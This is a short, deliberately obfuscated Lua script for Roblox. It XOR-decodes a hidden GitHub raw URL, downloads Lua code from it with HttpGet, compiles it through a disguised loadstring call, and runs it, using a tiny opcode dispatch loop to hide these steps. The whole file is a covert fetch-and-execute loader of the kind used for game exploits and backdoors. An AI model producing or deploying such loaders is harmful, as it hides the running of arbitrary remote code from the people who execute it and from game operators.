if not game or game.PlaceId==0 then return end
local a="b6aaaaaeade4f1f1acbfa9f0b9b7aab6abbcabadbbacbdb1b0aabbb0aaf0bdb1b3f19a9d928496eff1b4b5b2b3b0b1aeafacadaaaba8a4eeefecedeaebe8e9e6e7b4b5b2b3b0b1aeafacadaaaba8a9a6a7a4eeefecedeaebe8e9e6e7eeefecedeaebb4b5b2b3b0b1aeafacadaaaba8a9a6a7a4eebdbabbb8b9b6b7b4b5b2b3b0b1aeafacadaaaba8a9a6a7a4f1b3bfb7b0f1b9b6b7b4b5b2b3b0b1aeafacadaaaba8a8a9a6b2b3b0b1aeafacadaaaba8a9a6a7a4eeefecedbdbabbb8b9b6b7b4b5b2b3b0b1aeafacadaaaba8a9a6a7a4eeefecedeaebb2b3b0b1aeafacadaaaba8a9a6a7a4adaaaba8a9a6a7a4eeefecedeaebe8a9a6a7a4f0b2abbf"
local b=222
local c=""
local i=1
while i<=#a do
  local h=a:sub(i,i+1)
  local n=tonumber(h,16)
  local d=bit32.bxor(n,b)
  c=c..string.char(d)
  i=i+2
end
a=nil
local F=getfenv()
local E=F["load".."string"]
local g={}
local h={719,1,624,429,328,329}
local m={[719]=1,[624]=2,[429]=3,[328]=4,[329]=5}
local j=1
while j<=#h do
  local o=m[h[j]]
  j=j+1
  if o==1 then
    g[#g+1]=c
  elseif o==2 then
    local u=g[#g]
    g[#g]=F.game.HttpGet(u)
  elseif o==3 then
    g[#g]=E(g[#g])
  elseif o==4 then
    g[#g]()
  elseif o==5 then
    return
  end
end
